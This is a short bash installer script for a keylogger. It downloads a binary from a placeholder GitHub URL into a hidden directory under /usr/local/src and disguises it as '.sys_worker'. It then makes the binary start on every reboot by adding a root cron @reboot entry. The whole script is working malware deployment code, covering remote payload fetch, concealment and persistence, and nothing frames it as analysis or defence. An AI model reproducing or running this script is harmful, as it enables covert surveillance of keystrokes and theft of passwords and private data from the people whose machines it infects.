#!/bin/bash

# Configuration
GITHUB_REPO_URL="https://github.com/votre-compte/votre-repo/raw/main/keylogger"
INSTALL_DIR="/usr/local/src/.bin"
BINARY_NAME=".sys_worker"
CRON_JOB="@reboot sleep 30 && $INSTALL_DIR/$BINARY_NAME"

# Create the hidden directory
echo "[*] Creating hidden directory..."
sudo mkdir -p "$INSTALL_DIR"
sudo chmod 700 "$INSTALL_DIR"

# Download the keylogger (Assuming it's a pre-compiled binary on GitHub)
echo "[*] Downloading keylogger..."
sudo curl -L "$GITHUB_REPO_URL" -o "$INSTALL_DIR/$BINARY_NAME"
sudo chmod +x "$INSTALL_DIR/$BINARY_NAME"

# Setup persistence with Cron
echo "[*] Setting up persistence..."
(sudo crontab -l 2>/dev/null | grep -v "$BINARY_NAME"; echo "$CRON_JOB") | sudo crontab -

echo "[+] Installation complete. The keylogger will start automatically on next reboot."
echo "[+] Hidden binary path: $INSTALL_DIR/$BINARY_NAME"